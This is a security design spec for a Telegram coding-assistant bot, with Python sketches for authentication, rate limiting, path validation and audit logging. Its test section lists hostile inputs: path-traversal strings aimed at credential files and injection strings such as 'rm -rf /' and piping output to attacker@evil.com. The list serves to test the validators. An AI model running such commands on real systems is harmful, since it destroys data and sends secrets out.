# TODO-3: Authentication & Security Framework

## Objective
Implement a comprehensive security system that protects against unauthorized access, directory traversal attacks, and resource abuse while maintaining a smooth user experience.

## Security Architecture

### Multi-Layer Security Model
```
1. User Authentication (Who are you?)
   ├── Whitelist-based (Telegram User IDs)
   └── Token-based (Generated access tokens)

2. Authorization (What can you do?)
   ├── Directory boundaries
   ├── Command permissions
   └── Resource limits

3. Rate Limiting (How much can you do?)
   ├── Request rate limiting
   ├── Cost-based limiting
   └── Concurrent session limits

4. Input Validation (Is this safe?)
   ├── Path traversal prevention
   ├── Command injection prevention
   └── File type validation
```

## Authentication Implementation

### Authentication Manager
```python
# src/security/auth.py
"""
Authentication system supporting multiple methods

Features:
- Telegram ID whitelist
- Token-based authentication
- Session management
- Audit logging
"""

from abc import ABC, abstractmethod
from typing import Optional, Dict, Any
from datetime import datetime, timedelta
import secrets
import hashlib

class AuthProvider(ABC):
    """Base authentication provider"""
    
    @abstractmethod
    async def authenticate(self, user_id: int, credentials: Dict[str, Any]) -> bool:
        """Verify user credentials"""
        pass
    
    @abstractmethod
    async def get_user_info(self, user_id: int) -> Optional[Dict[str, Any]]:
        """Get user information"""
        pass

class WhitelistAuthProvider(AuthProvider):
    """Whitelist-based authentication"""
    
    def __init__(self, allowed_users: List[int]):
        self.allowed_users = set(allowed_users)
    
    async def authenticate(self, user_id: int, credentials: Dict[str, Any]) -> bool:
        return user_id in self.allowed_users
    
    async def get_user_info(self, user_id: int) -> Optional[Dict[str, Any]]:
        if user_id in self.allowed_users:
            return {"user_id": user_id, "auth_type": "whitelist"}
        return None

class TokenAuthProvider(AuthProvider):
    """Token-based authentication"""
    
    def __init__(self, secret: str, storage: 'TokenStorage'):
        self.secret = secret
        self.storage = storage
    
    async def authenticate(self, user_id: int, credentials: Dict[str, Any]) -> bool:
        token = credentials.get('token')
        if not token:
            return False
        
        stored_token = await self.storage.get_user_token(user_id)
        return stored_token and self._verify_token(token, stored_token)
    
    async def generate_token(self, user_id: int) -> str:
        """Generate new authentication token"""
        token = secrets.token_urlsafe(32)
        hashed = self._hash_token(token)
        await self.storage.store_token(user_id, hashed)
        return token
    
    def _hash_token(self, token: str) -> str:
        """Hash token for storage"""
        return hashlib.sha256(f"{token}{self.secret}".encode()).hexdigest()
    
    def _verify_token(self, token: str, stored_hash: str) -> bool:
        """Verify token against stored hash"""
        return self._hash_token(token) == stored_hash

class AuthenticationManager:
    """Main authentication manager"""
    
    def __init__(self, providers: List[AuthProvider]):
        self.providers = providers
        self.sessions: Dict[int, 'UserSession'] = {}
    
    async def authenticate_user(self, user_id: int, credentials: Optional[Dict[str, Any]] = None) -> bool:
        """Try authentication with all providers"""
        credentials = credentials or {}
        
        for provider in self.providers:
            if await provider.authenticate(user_id, credentials):
                await self._create_session(user_id, provider)
                return True
        
        return False
    
    async def _create_session(self, user_id: int, provider: AuthProvider):
        """Create authenticated session"""
        user_info = await provider.get_user_info(user_id)
        self.sessions[user_id] = UserSession(
            user_id=user_id,
            auth_provider=provider.__class__.__name__,
            created_at=datetime.utcnow(),
            user_info=user_info
        )
    
    def is_authenticated(self, user_id: int) -> bool:
        """Check if user has active session"""
        session = self.sessions.get(user_id)
        return session and not session.is_expired()
    
    def get_session(self, user_id: int) -> Optional['UserSession']:
        """Get user session"""
        return self.sessions.get(user_id)
```

### Rate Limiting
```python
# src/security/rate_limiter.py
"""
Rate limiting implementation with multiple strategies

Features:
- Token bucket algorithm
- Cost-based limiting
- Per-user tracking
- Burst handling
"""

from collections import defaultdict
from dataclasses import dataclass
from datetime import datetime, timedelta
import asyncio

@dataclass
class RateLimitBucket:
    """Token bucket for rate limiting"""
    capacity: int
    tokens: float
    last_update: datetime
    
    def consume(self, tokens: int = 1) -> bool:
        """Try to consume tokens"""
        self._refill()
        if self.tokens >= tokens:
            self.tokens -= tokens
            return True
        return False
    
    def _refill(self):
        """Refill tokens based on time passed"""
        now = datetime.utcnow()
        elapsed = (now - self.last_update).total_seconds()
        self.tokens = min(self.capacity, self.tokens + elapsed)
        self.last_update = now

class RateLimiter:
    """Main rate limiting system"""
    
    def __init__(self, config: 'Settings'):
        self.config = config
        self.request_buckets: Dict[int, RateLimitBucket] = {}
        self.cost_tracker: Dict[int, float] = defaultdict(float)
        self.locks: Dict[int, asyncio.Lock] = defaultdict(asyncio.Lock)
    
    async def check_rate_limit(self, user_id: int, cost: float = 1.0) -> Tuple[bool, Optional[str]]:
        """Check if request is allowed"""
        async with self.locks[user_id]:
            # Check request rate
            if not self._check_request_rate(user_id):
                return False, "Rate limit exceeded. Please wait before making more requests."
            
            # Check cost limit
            if not self._check_cost_limit(user_id, cost):
                remaining = self.config.claude_max_cost_per_user - self.cost_tracker[user_id]
                return False, f"Cost limit exceeded. Remaining budget: ${remaining:.2f}"
            
            return True, None
    
    def _check_request_rate(self, user_id: int) -> bool:
        """Check request rate limit"""
        if user_id not in self.request_buckets:
            self.request_buckets[user_id] = RateLimitBucket(
                capacity=self.config.rate_limit_burst,
                tokens=self.config.rate_limit_burst,
                last_update=datetime.utcnow()
            )
        
        return self.request_buckets[user_id].consume()
    
    def _check_cost_limit(self, user_id: int, cost: float) -> bool:
        """Check cost-based limit"""
        if self.cost_tracker[user_id] + cost > self.config.claude_max_cost_per_user:
            return False
        
        self.cost_tracker[user_id] += cost
        return True
    
    async def reset_user_limits(self, user_id: int):
        """Reset limits for a user"""
        async with self.locks[user_id]:
            self.cost_tracker[user_id] = 0
            if user_id in self.request_buckets:
                self.request_buckets[user_id].tokens = self.config.rate_limit_burst
```

### Directory Security
```python
# src/security/validators.py
"""
Input validation and security checks

Features:
- Path traversal prevention
- Command injection prevention
- File type validation
- Input sanitization
"""

import os
import re
from pathlib import Path
from typing import Optional, List

class SecurityValidator:
    """Security validation for user inputs"""
    
    # Dangerous patterns
    DANGEROUS_PATTERNS = [
        r'\.\.',           # Parent directory
        r'~',              # Home directory
        r'\$',             # Variable expansion
        r'`',              # Command substitution
        r';',              # Command chaining
        r'&&',             # Command chaining
        r'\|\|',           # Command chaining
        r'>',              # Redirection
        r'<',              # Redirection
        r'\|',             # Piping
    ]
    
    # Allowed file extensions
    ALLOWED_EXTENSIONS = {
        '.py', '.js', '.ts', '.jsx', '.tsx', '.java', '.cpp', '.c',
        '.h', '.hpp', '.cs', '.go', '.rs', '.rb', '.php', '.swift',
        '.kt', '.md', '.txt', '.json', '.yml', '.yaml', '.toml',
        '.xml', '.html', '.css', '.scss', '.sql', '.sh', '.bash'
    }
    
    def __init__(self, approved_directory: Path):
        self.approved_directory = approved_directory.resolve()
    
    def validate_path(self, user_path: str, current_dir: Path) -> Tuple[bool, Optional[Path], Optional[str]]:
        """Validate and resolve user-provided path"""
        try:
            # Check for dangerous patterns
            for pattern in self.DANGEROUS_PATTERNS:
                if re.search(pattern, user_path):
                    return False, None, f"Invalid path: contains forbidden pattern"
            
            # Resolve path
            if user_path.startswith('/'):
                # Absolute path within approved directory
                target = self.approved_directory / user_path.lstrip('/')
            else:
                # Relative path
                target = current_dir / user_path
            
            # Resolve and check boundaries
            target = target.resolve()
            
            # Must be within approved directory
            if not self._is_within_directory(target, self.approved_directory):
                return False, None, "Access denied: path outside approved directory"
            
            return True, target, None
            
        except Exception as e:
            return False, None, f"Invalid path: {str(e)}"
    
    def _is_within_directory(self, path: Path, directory: Path) -> bool:
        """Check if path is within directory"""
        try:
            path.relative_to(directory)
            return True
        except ValueError:
            return False
    
    def validate_filename(self, filename: str) -> Tuple[bool, Optional[str]]:
        """Validate uploaded filename"""
        # Check for path traversal in filename
        if '/' in filename or '\\' in filename:
            return False, "Invalid filename: contains path separators"
        
        # Check extension
        ext = Path(filename).suffix.lower()
        if ext not in self.ALLOWED_EXTENSIONS:
            return False, f"File type not allowed: {ext}"
        
        # Check for hidden files
        if filename.startswith('.'):
            return False, "Hidden files not allowed"
        
        return True, None
    
    def sanitize_command_input(self, text: str) -> str:
        """Sanitize text input for commands"""
        # Remove potentially dangerous characters
        sanitized = re.sub(r'[`$;|&<>]', '', text)
        
        # Limit length
        max_length = 1000
        if len(sanitized) > max_length:
            sanitized = sanitized[:max_length]
        
        return sanitized.strip()
```

### Audit Logging
```python
# src/security/audit.py
"""
Security audit logging

Features:
- All authentication attempts
- Command execution
- File access
- Security violations
"""

@dataclass
class AuditEvent:
    timestamp: datetime
    user_id: int
    event_type: str
    success: bool
    details: Dict[str, Any]
    ip_address: Optional[str] = None

class AuditLogger:
    """Security audit logger"""
    
    def __init__(self, storage: 'AuditStorage'):
        self.storage = storage
    
    async def log_auth_attempt(self, user_id: int, success: bool, method: str, reason: Optional[str] = None):
        """Log authentication attempt"""
        await self.storage.store_event(AuditEvent(
            timestamp=datetime.utcnow(),
            user_id=user_id,
            event_type='auth_attempt',
            success=success,
            details={
                'method': method,
                'reason': reason
            }
        ))
    
    async def log_command(self, user_id: int, command: str, args: List[str], success: bool):
        """Log command execution"""
        await self.storage.store_event(AuditEvent(
            timestamp=datetime.utcnow(),
            user_id=user_id,
            event_type='command',
            success=success,
            details={
                'command': command,
                'args': args
            }
        ))
    
    async def log_security_violation(self, user_id: int, violation_type: str, details: str):
        """Log security violation"""
        await self.storage.store_event(AuditEvent(
            timestamp=datetime.utcnow(),
            user_id=user_id,
            event_type='security_violation',
            success=False,
            details={
                'violation_type': violation_type,
                'details': details
            }
        ))
```

## Middleware Implementation

### Authentication Middleware
```python
# src/bot/middleware/auth.py
"""
Telegram bot authentication middleware
"""

async def auth_middleware(handler, event, data):
    """Check authentication before processing"""
    user_id = event.from_user.id
    
    # Get auth manager from context
    auth_manager = data['auth_manager']
    
    # Check authentication
    if not auth_manager.is_authenticated(user_id):
        # Try to authenticate
        if not await auth_manager.authenticate_user(user_id):
            await event.reply_text(
                "🔒 Authentication required.\n"
                "You are not authorized to use this bot.\n"
                "Contact the administrator for access."
            )
            return
    
    # Update session activity
    session = auth_manager.get_session(user_id)
    session.last_activity = datetime.utcnow()
    
    # Continue to handler
    return await handler(event, data)
```

### Rate Limiting Middleware
```python
# src/bot/middleware/rate_limit.py
"""
Rate limiting middleware
"""

async def rate_limit_middleware(handler, event, data):
    """Check rate limits before processing"""
    user_id = event.from_user.id
    rate_limiter = data['rate_limiter']
    
    # Check rate limit (default cost of 1)
    allowed, message = await rate_limiter.check_rate_limit(user_id)
    
    if not allowed:
        await event.reply_text(f"⏱️ {message}")
        return
    
    return await handler(event, data)
```

## Testing Security

### Security Test Cases
```python
# tests/test_security.py
"""
Security testing
"""

# Path traversal attempts
test_paths = [
    "../../../etc/passwd",
    "~/.ssh/id_rsa",
    "/etc/shadow",
    "project/../../../",
    "project/./../../",
    "project%2F..%2F..%2F",
]

# Command injection attempts
test_commands = [
    "test; rm -rf /",
    "test && cat /etc/passwd",
    "test | mail attacker@evil.com",
    "test `whoami`",
    "test $(pwd)",
]

# File upload tests
test_files = [
    "malicious.exe",
    "../../../.bashrc",
    ".hidden_file",
    "test.unknown",
]
```

## Success Criteria

- [ ] Whitelist authentication working
- [ ] Token-based authentication implemented
- [ ] Rate limiting prevents abuse
- [ ] Cost tracking enforced
- [ ] Path traversal attempts blocked
- [ ] Command injection prevented
- [ ] File type validation working
- [ ] Audit logging captures all events
- [ ] Middleware properly intercepts requests
- [ ] All security tests pass
- [ ] No security vulnerabilities in OWASP top 10